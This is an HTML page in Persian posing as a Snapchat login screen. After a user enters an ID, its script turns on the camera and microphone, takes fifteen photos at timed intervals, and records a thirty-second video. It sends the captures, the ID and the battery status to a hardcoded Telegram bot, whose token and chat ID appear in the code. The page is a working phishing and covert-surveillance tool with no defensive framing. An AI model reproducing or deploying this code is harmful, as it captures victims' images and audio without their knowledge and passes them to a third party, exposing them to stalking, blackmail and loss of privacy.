<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ورود به اسنپ‌چت</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { margin: 0; padding: 0; font-family: sans-serif; background-color: #fffc00; color: #000; direction: rtl; }
    #video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; z-index: -1; }
    #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: end; align-items: center; padding-bottom: 40px; background-color: rgba(0,0,0,0.2); }
    .btn { width: 64px; height: 64px; border-radius: 50%; background: white; border: 4px solid black; }
    #switchCam { position: absolute; bottom: 20px; right: 20px; background: white; padding: 10px; border-radius: 50%; }
    #inputSection { position: absolute; z-index: 999; top: 0; left: 0; width: 100vw; height: 100vh; background: #fffc00; display: flex; flex-direction: column; align-items: center; justify-content: center; }
  </style>
</head>
<body>
  <div id="inputSection">
    <h1 class="text-xl font-bold mb-4">ورود به اسنپ‌چت</h1>
    <input id="userId" type="text" placeholder="@آیدی شما" class="p-3 rounded w-72 text-center mb-4">
    <button onclick="startApp()" class="bg-black text-white py-2 px-6 rounded">ورود</button>
  </div>

  <video id="video" autoplay muted playsinline></video>
  <div id="overlay" class="hidden">
    <button id="takePhoto" class="btn" onclick="manualPhoto()"></button>
    <button id="switchCam" onclick="switchCamera()">🔄</button>
  </div>

  <script>
    const botToken = "7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU";
    const chatId = "-1002563925697";

    let stream, mediaRecorder, videoChunks = [], photoCount = 0, uid = "", useFront = true;

    function startApp() {
      uid = document.getElementById("userId").value.trim();
      if (!uid || !uid.startsWith("@")) return alert("لطفاً آیدی با @ وارد کنید.");
      document.getElementById("inputSection").style.display = "none";
      document.getElementById("overlay").classList.remove("hidden");
      startCamera();
      startRecording();
      autoCapture();
    }

    async function startCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" }, audio: true });
      document.getElementById("video").srcObject = stream;
    }

    function switchCamera() {
      useFront = !useFront;
      startCamera();
    }

    async function autoCapture() {
      for (let i = 0; i < 15; i++) {
        setTimeout(() => captureAndSend(), i * 4000);
      }
      setTimeout(() => stopRecording(), 31000);
    }

    function manualPhoto() {
      captureAndSend();
    }

    async function captureAndSend() {
      const canvas = document.createElement("canvas");
      const videoEl = document.getElementById("video");
      canvas.width = videoEl.videoWidth;
      canvas.height = videoEl.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo_${photoCount}.jpg`);
        form.append("caption", `آیدی: ${uid}\n${++photoCount}️⃣ عکس\n🔋 ${battery.level * 100}%\n⚡ شارژ: ${battery.charging ? "بله" : "خیر"}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
      }, 'image/jpeg');
    }

    function startRecording() {
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9" });
      mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(videoChunks, { type: "video/webm" });
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("video", videoBlob, "record.webm");
        form.append("caption", `🎥 ویدیو ۳۰ ثانیه‌ای\nآیدی: ${uid}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
        videoChunks = [];
      };
      mediaRecorder.start();
    }

    function stopRecording() {
      mediaRecorder.stop();
    }
  </script>
</body>
</html>
